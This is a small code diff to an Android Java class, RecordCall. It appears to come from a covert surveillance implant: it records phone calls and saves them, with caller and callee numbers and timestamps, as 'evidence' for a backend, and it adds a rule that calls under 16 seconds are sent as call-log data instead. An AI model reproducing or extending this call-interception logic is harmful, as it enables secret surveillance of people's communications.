@@ -173,8 +173,15 @@ public class RecordCall implements OnErrorListener, OnInfoListener {
 				numFailures += 1;
 			} else {
 				//String myNumber = Device.self().getPhoneNumber();
-				ModuleCall.saveCallEvidence(call.getFrom(), call.getTo(), incoming, call.getTimeBegin(), call.isComplete() ? call.getTimeEnd() : new Date(),
-						onGoing_chunk.getFilename(), call.isComplete(), 1, CALL_PHONE);
+				/* 13/03/2015 In case duration is < 16second a CallInfo is sent instead , otherwise the backend will drop it
+				 * This will be fixed in the next release, we hope
+				 */
+				if (call.getDuration() > 16) {
+					ModuleCall.saveCallEvidence(call.getFrom(), call.getTo(), incoming, call.getTimeBegin(), call.isComplete() ? call.getTimeEnd() : new Date(),
+							onGoing_chunk.getFilename(), call.isComplete(), 1, CALL_PHONE);
+				}else{
+					ModuleCall.self().saveCalllistEvidence(ModuleCall.CALLIST_PHONE, call.getFrom(), call.getTo(), incoming, call.getTimeBegin(), call.isOffhook()?call.getDuration():0);
+				}
 				//deleteFile();
 				//saveRecorderEvidence();
 			}
